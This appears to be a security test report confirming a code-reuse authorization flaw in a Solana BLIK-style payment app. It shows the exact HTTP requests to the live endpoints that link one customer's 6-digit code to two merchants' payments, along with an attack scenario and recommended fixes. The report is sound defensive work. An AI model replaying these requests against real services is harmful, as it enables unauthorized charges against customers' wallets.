# AUTHZ-VULN-07: Code Reuse Vulnerability - Test Results

**Test Date:** 2026-03-21
**Vulnerability Status:** ✅ **CONFIRMED - CRITICAL SEVERITY**

---

## Executive Summary

The test successfully confirmed **AUTHZ-VULN-07**: a single BLIK code can be linked to multiple payment requests, allowing one customer approval to authorize payments to multiple different merchants. This is a **HIGH SEVERITY** authorization vulnerability.

---

## Test Methodology

### Multi-Step Test Execution

1. **Step 1:** Create Payment A (1.0 SOL to Merchant 1)
2. **Step 2:** Create Payment B (2.0 SOL to Merchant 2)
3. **Step 3:** Generate a single BLIK code (Customer)
4. **Step 4:** Link the code to Payment A (First linking - Expected to succeed)
5. **Step 5:** **EXPLOIT** - Try to link the SAME code to Payment B (Should fail if secure)

---

## Test Results

### Step 1: Create Payment A ✅
**Request:**
```http
POST https://solana-blik.vercel.app/api/payments/create
Content-Type: application/json

{
  "amount": 1.0,
  "merchantWallet": "FzYRCGNJfUC1E2oKmVTXQTRPVCYU4mAqhCdHcjz5gWHH"
}
```

**Response:**
```json
{
  "status": 200,
  "paymentId": "f7a7fe0a-237b-41b3-983b-83b0be629237"
}
```

✅ **Success:** Payment A created for Merchant 1

---

### Step 2: Create Payment B ✅
**Request:**
```http
POST https://solana-blik.vercel.app/api/payments/create
Content-Type: application/json

{
  "amount": 2.0,
  "merchantWallet": "GJxbZPWq2NqGmZL8PmP4STcJ9QF9pFWH3K9hZqCx9kPQ"
}
```

**Response:**
```json
{
  "status": 200,
  "paymentId": "96d5c960-7251-4f6c-b201-f73c149b2309"
}
```

✅ **Success:** Payment B created for Merchant 2

---

### Step 3: Generate BLIK Code ✅
**Request:**
```http
POST https://solana-blik.vercel.app/api/codes/generate
Content-Type: application/json

{
  "walletPubkey": "8sjtm4PGfx6LTU4AJ6rDtPTQfqKCwsPBrQ4F8Q3vJhh1"
}
```

**Response:**
```json
{
  "status": 200,
  "code": "623088"
}
```

✅ **Success:** Customer code generated: **623088**

---

### Step 4: Link Code to Payment A ✅
**Request:**
```http
POST https://solana-blik.vercel.app/api/payments/link
Content-Type: application/json

{
  "paymentId": "f7a7fe0a-237b-41b3-983b-83b0be629237",
  "code": "623088"
}
```

**Response:**
```json
{
  "status": 200,
  "matched": true,
  "amount": 1,
  "walletPubkey": "8sjtm4PGfx6LTU4AJ6rDtPTQfqKCwsPBrQ4F8Q3vJhh1",
  "reference": "AboYjE2Mr2gzUbu25hAhfhoZBfPPHNm1mB91SY4sHzXh",
  "receiptPda": "AboYjE2Mr2gzUbu25hAhfhoZBfPPHNm1mB91SY4sHzXh"
}
```

✅ **Success:** Code 623088 linked to Payment A (1.0 SOL)

---

### Step 5: 🔴 EXPLOIT - Reuse Code for Payment B 🚨
**Request:**
```http
POST https://solana-blik.vercel.app/api/payments/link
Content-Type: application/json

{
  "paymentId": "96d5c960-7251-4f6c-b201-f73c149b2309",
  "code": "623088"
}
```

**Response:**
```json
{
  "status": 200,
  "matched": true,
  "amount": 2,
  "walletPubkey": "8sjtm4PGfx6LTU4AJ6rDtPTQfqKCwsPBrQ4F8Q3vJhh1",
  "reference": "GmiDHkJN24vf31hk1ML1DxXgTs2FczEY7H5uHVc9hBtH",
  "receiptPda": "GmiDHkJN24vf31hk1ML1DxXgTs2FczEY7H5uHVc9hBtH"
}
```

🚨 **VULNERABILITY CONFIRMED:** Same code (623088) successfully linked to Payment B (2.0 SOL)!

---

## Vulnerability Analysis

### 🚨 VULNERABILITY CONFIRMED: AUTHZ-VULN-07

**Severity:** HIGH / CRITICAL

**Description:**
A single BLIK code can be linked to multiple payment requests. This allows one customer approval to authorize payments to multiple different merchants.

### Evidence

- **Payment A (1.0 SOL to Merchant 1):** Linked successfully with code 623088
- **Payment B (2.0 SOL to Merchant 2):** ALSO linked successfully with the SAME code 623088
- **Customer Wallet:** 8sjtm4PGfx6LTU4AJ6rDtPTQfqKCwsPBrQ4F8Q3vJhh1
- **Both linkings returned:** `"matched": true` with status 200

### Impact

1. **Customer approves ONE code** (expecting to pay 1.0 SOL)
2. **Malicious actor links it to multiple payments** (1.0 SOL + 2.0 SOL)
3. **Customer unknowingly authorizes payments to multiple merchants**
4. **Total exposure: 3.0 SOL from a single approval**

### Attack Scenario

1. Customer generates code for 1 SOL payment to Merchant A
2. Attacker intercepts/observes the 6-digit code (e.g., via MITM, shoulder surfing, or code enumeration)
3. Attacker creates their own payment request for 2 SOL to Merchant B (attacker's wallet)
4. Attacker links the SAME code to their payment request
5. When customer confirms the transaction, both payments are authorized
6. Customer loses 3 SOL instead of intended 1 SOL

### Financial Impact

- **Direct Loss:** Customer pays multiple times the intended amount
- **Loss of Trust:** Customers lose confidence in the payment system
- **Merchant Risk:** Legitimate merchants may face chargebacks/disputes
- **Scale:** Attack can be repeated for any number of payment requests

---

## Technical Root Cause

The `/api/payments/link` endpoint does not:

1. Check if a code has already been linked to another payment
2. Implement one-to-one code-to-payment constraint
3. Mark codes as "consumed" after first successful link
4. Enforce uniqueness at the database level
5. Protect against race conditions when multiple link attempts occur simultaneously

---

## Recommendations

### Immediate Fixes (Critical)

1. **Implement One-to-One Constraint**
   - Each code can only be linked to ONE payment request
   - Mark codes as "used" immediately after first successful link

2. **Atomic Code Consumption**
   ```typescript
   // Before linking
   const code = await redis.get(`code:${codeValue}`);
   if (!code || code.used) {
     return { error: 'Code already used or invalid' };
   }

   // Atomic check-and-set
   const wasSet = await redis.set(
     `code:${codeValue}:used`,
     paymentId,
     { NX: true } // Only set if not exists
   );

   if (!wasSet) {
     return { error: 'Code already used' };
   }
   ```

3. **Database Uniqueness Constraint**
   - Add unique index on code-to-payment linkage
   - Prevent duplicate linkings at the data layer

4. **Code State Management**
   ```typescript
   enum CodeState {
     GENERATED = 'generated',
     LINKED = 'linked',
     USED = 'used',
     EXPIRED = 'expired'
   }
   ```

5. **Race Condition Protection**
   - Use Redis transactions (MULTI/EXEC) or Lua scripts
   - Implement optimistic locking with version numbers

### Additional Security Measures

1. **Audit Logging**
   - Log all code linking attempts
   - Alert on multiple link attempts for same code

2. **Rate Limiting**
   - Limit link attempts per code per time window
   - Implement progressive delays on failed attempts

3. **Code Expiration**
   - Expire codes after first successful link
   - Implement short TTL (e.g., 2 minutes after linking)

---

## Test Artifacts

### Test Identifiers

- **Merchant Wallet 1:** FzYRCGNJfUC1E2oKmVTXQTRPVCYU4mAqhCdHcjz5gWHH
- **Merchant Wallet 2:** GJxbZPWq2NqGmZL8PmP4STcJ9QF9pFWH3K9hZqCx9kPQ
- **Customer Wallet:** 8sjtm4PGfx6LTU4AJ6rDtPTQfqKCwsPBrQ4F8Q3vJhh1
- **Payment A ID:** f7a7fe0a-237b-41b3-983b-83b0be629237
- **Payment B ID:** 96d5c960-7251-4f6c-b201-f73c149b2309
- **Reused Code:** 623088

### Test Script

The automated test script is available at:
- `/Users/mac/kodziki/apps/solana-blik/test_authz_vuln_07.js`

---

## Conclusion

**AUTHZ-VULN-07 is CONFIRMED.** The SolanaBLIK application allows a single BLIK code to be linked to multiple payment requests, enabling a single customer approval to authorize payments to multiple merchants. This is a critical authorization vulnerability that must be fixed before production deployment.

**Recommended Action:** Implement one-to-one code-to-payment constraint with atomic code consumption and race condition protection immediately.
